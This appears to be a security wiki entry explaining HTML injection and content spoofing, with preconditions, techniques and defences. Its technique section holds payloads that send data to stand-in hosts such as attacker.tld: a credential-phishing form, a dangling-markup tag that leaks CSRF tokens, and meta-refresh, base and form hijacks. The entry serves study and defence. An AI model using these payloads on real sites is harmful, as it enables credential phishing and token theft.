---
title: HTML injection / content spoofing
slug: html-injection
---

{% raw %}

> **TL;DR:** Attacker-controlled HTML rendered without script execution — still phishes, deceives, leaks via dangling markup.

## What it is
A reflected or stored sink renders attacker HTML but a strong CSP, sanitiser, or template escapes blocks script execution. The remaining markup-level primitive is still useful: inject phishing forms, deface, hijack pixel layout, or use dangling-markup tricks to exfiltrate CSRF tokens and other DOM data without a single `<script>`.

## Preconditions / where it applies
- Sink renders attacker bytes as HTML (innerHTML, template `{{{var}}}`, server-side string concat)
- Script execution blocked (CSP, sanitiser strips `<script>`/event handlers, Trusted Types)
- Page contains data the attacker wants (CSRF tokens, email addresses, OAuth state, partial OTPs)

## Technique
1. **Phishing / deface** — inject a believable form:
   ```html
   <h1>Session expired</h1>
   <form action="https://attacker.tld/c" method="POST">
     <input name="user"><input name="pass" type="password">
     <button>Continue</button>
   </form>
   ```
   Browser autofill helps; victim re-types creds.
2. **Dangling-markup exfil** — open a tag without closing; the parser eats subsequent page bytes until it finds a terminator. Send the chunk to attacker:
   ```html
   <img src='https://attacker.tld/?leak=
   ```
   Everything from the injection point until the next `'` or end-of-attribute is appended to the URL — including CSRF tokens, emails, etc. Variants use `<base>`, `<link rel=icon>`, `<form>` without close, single/double quote desync.
3. **Reverse-tabnabbing** — `<a target=_blank href=...>` without `rel=noopener` lets the new tab repoint the opener.
4. **Style injection** — `<style>` or `style=` attribute can leak chosen-prefix data via `:has()`/attribute selectors + background-image (see [[css-injection-exfiltration]]).
5. **Meta refresh / base hijack** — `<meta http-equiv=refresh content="0;url=//attacker">` or `<base href="//attacker">` for redirects and relative URL hijack.
6. **Iframe overlay** for clickjacking the same page from inside ([[clickjacking]]).
7. **Form hijack** — inject an opening `<form action=//attacker>` *before* the legitimate form; the legitimate `<input>`s become children of the attacker form and submit to attacker on click.

## Detection and defence
- Context-aware HTML escaping (encode `<`, `>`, `"`, `'`, `&`) at every server-side render; never concat user data into HTML.
- DOMPurify or equivalent for client-side sanitisation; strip dangerous tags (`<base>`, `<meta>`, `<form>`, `<iframe>`, `<style>`, `<link>`, `<svg>`) and any tag/attribute with `formaction`, `href`, `xlink:href`, `srcdoc`.
- CSP `frame-ancestors`, `form-action 'self'`, `base-uri 'none'`, `img-src` and `style-src` tight to prevent dangling-markup callbacks.
- Output `Referrer-Policy: same-origin` so leak URLs lose the referer.
- Hunt: stored content rendered to other users; review every innerHTML/`v-html`/`dangerouslySetInnerHTML` usage.
- Related: [[cross-site-scripting]], [[dom-xss]], [[css-injection-exfiltration]], [[clickjacking]].

## References
- [PortSwigger — dangling markup](https://portswigger.net/web-security/cross-site-scripting/dangling-markup) — canonical exfil pattern
- [OWASP — content spoofing](https://owasp.org/www-community/attacks/Content_Spoofing) — taxonomy
- [PayloadsAllTheThings — XSS / HTML injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) — payload corpus
{% endraw %}
